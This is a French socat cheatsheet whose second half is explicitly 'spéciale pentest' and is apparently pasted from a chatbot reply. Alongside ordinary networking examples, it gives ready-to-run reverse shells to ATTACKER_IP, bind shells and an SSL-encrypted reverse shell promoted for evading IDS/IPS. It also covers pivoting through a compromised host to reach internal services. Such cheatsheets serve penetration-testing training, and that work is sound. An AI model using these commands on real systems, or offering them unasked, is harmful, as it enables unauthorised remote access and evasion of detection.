# 📜 Socat Cheatsheet

## 📌 Commande générale
```bash
socat [OPTIONS] <endpoint1> <endpoint2>
````

* **endpoint** = type de connexion (TCP, UDP, FILE, EXEC, PTY, SSL…)
* Options utiles :

  * `-d -d` → debug
  * `-v` → verbose
  * `-T` → timeout

---

## 🔹 1. Serveur TCP simple

```bash
socat -v TCP-LISTEN:4444,reuseaddr,fork STDOUT
```

* `reuseaddr` : réutiliser le port
* `fork` : gérer plusieurs clients

---

## 🔹 2. Client TCP simple

```bash
socat -v STDIN TCP:192.168.1.10:4444
```

---

## 🔹 3. Chat bidirectionnel (Netcat-like)

**Serveur :**

```bash
socat TCP-LISTEN:4444,reuseaddr,fork STDIO
```

**Client :**

```bash
socat STDIO TCP:serveur:4444
```

---

## 🔹 4. Reverse shell

**Victime → Attaquant :**

```bash
socat TCP:ATTACKER_IP:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

**Attaquant (réception) :**

```bash
socat TCP-LISTEN:4444,reuseaddr,fork STDOUT
```

---

## 🔹 5. Bind shell

**Victime :**

```bash
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

**Attaquant :**

```bash
socat STDIO TCP:VICTIM_IP:4444
```

---

## 🔹 6. Transfert de fichier

**Serveur (envoi) :**

```bash
socat TCP-LISTEN:4444,reuseaddr,fork FILE:fichier.txt
```

**Client (réception) :**

```bash
socat TCP:IP:4444 FILE:recup.txt,create
```

---

## 🔹 7. Redirection de port

```bash
socat TCP-LISTEN:8080,reuseaddr,fork TCP:10.0.0.5:80
```

---

## 🔹 8. Port série

```bash
socat -d -d FILE:/dev/ttyUSB0,b115200 STDOUT
```

---

## 🔹 9. SSL/TLS

**Client SSL :**

```bash
socat - OPENSSL:example.com:443,verify=0
```

**Serveur SSL :**

```bash
socat OPENSSL-LISTEN:443,reuseaddr,cert=cert.pem,key=key.pem TCP:127.0.0.1:80
```

---

## 🔹 10. Socket UNIX

**Client :**

```bash
socat - UNIX-CONNECT:/tmp/socket.sock
```

**Serveur :**

```bash
socat UNIX-LISTEN:/tmp/socket.sock,fork STDOUT
```

---

## 💡 Astuces

* `-v` : afficher les données transférées.
* `pty` : shell interactif correct.
* `fork` : indispensable pour gérer plusieurs connexions.
* `socat` peut aider à bypasser un firewall si les ports sortants sont ouverts.


Parfait, je vais te faire une **cheatsheet socat spéciale pentest** en **Markdown**, centrée sur les usages offensifs : reverse shell, bind shell, port forwarding, tunneling, pivot, chiffrement, etc.

---

* **Endpoints fréquents :**

  * `TCP:<host>:<port>` : connexion TCP
  * `TCP-LISTEN:<port>,reuseaddr,fork` : serveur TCP
  * `EXEC:<cmd>,pty,stderr,setsid,sigint,sane` : exécuter un shell
  * `OPENSSL:<host>:<port>,verify=0` : connexion SSL/TLS
  * `OPENSSL-LISTEN:<port>,cert=<file>,key=<file>` : serveur SSL/TLS
  * `UNIX-LISTEN:/tmp/socket.sock` ou `UNIX-CONNECT:/tmp/socket.sock` : socket Unix

---

## 🔹 Reverse Shell

**Victime → Attaquant**

```bash
# Victime
socat TCP:ATTACKER_IP:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# Attaquant
socat TCP-LISTEN:4444,reuseaddr,fork STDIO
```

💡 Utiliser `pty,sane` pour un shell interactif complet.

---

## 🔹 Bind Shell

**Victime écoute, attaquant se connecte**

```bash
# Victime
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# Attaquant
socat STDIO TCP:VICTIM_IP:4444
```

---

## 🔹 Reverse Shell Chiffré (SSL)

```bash
# Attaquant (listener SSL)
socat OPENSSL-LISTEN:4444,cert=cert.pem,key=key.pem,verify=0,fork STDIO

# Victime
socat OPENSSL:ATTACKER_IP:4444,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

💡 Idéal pour contourner IDS/IPS basiques.

---

## 🔹 Port Forwarding (Local ↔ Remote)

**Rediriger localement un port vers une cible interne**

```bash
socat TCP-LISTEN:8080,reuseaddr,fork TCP:10.0.0.5:80
```

**Redirection inverse (remote port forwarding)**

```bash
socat TCP-LISTEN:4444,reuseaddr,fork TCP:localhost:22
```

---

## 🔹 Pivot / Tunnel via hôte compromis

**Exposer un service interne à travers la victime**

```bash
# Sur la victime (pivot)
socat TCP-LISTEN:9000,reuseaddr,fork TCP:127.0.0.1:3306
```

➡ L’attaquant se connecte sur `<victime>:9000` pour atteindre MySQL interne.

---

## 🔹 Proxy avec chiffrement

**Tunnel chiffré entre deux machines**

```bash
# Serveur proxy chiffré
socat OPENSSL-LISTEN:443,cert=cert.pem,key=key.pem,fork TCP:127.0.0.1:22

# Client vers proxy
socat TCP-LISTEN:2222,fork OPENSSL:server_ip:443,verify=0
```

➡ Permet un `ssh localhost -p 2222` sécurisé.

---

## 🔹 Reverse SOCKS Proxy via Socat + SSH

```bash
ssh -D 1080 user@pivot
socat TCP-LISTEN:8080,reuseaddr,fork SOCKS4:127.0.0.1:target:80,socksport=1080
```

---

## 🔹 File Transfer

**Envoi**

```bash
socat TCP-LISTEN:4444,reuseaddr,fork FILE:file.txt
```

**Réception**

```bash
socat TCP:IP:4444 FILE:received.txt,create
```

---

## 💡 Conseils Pentest

* Utiliser `pty` pour un shell interactif correct.
* Ajouter `stderr,setsid,sigint,sane` pour stabilité.
* Utiliser SSL/TLS pour éviter détection triviale.
* `fork` est indispensable pour gérer plusieurs connexions.
* `verify=0` permet de se connecter sans certificat valide.
* Combine bien avec `proxychains`, `ssh -D`, ou `chisel` pour pivoting avancé.

---


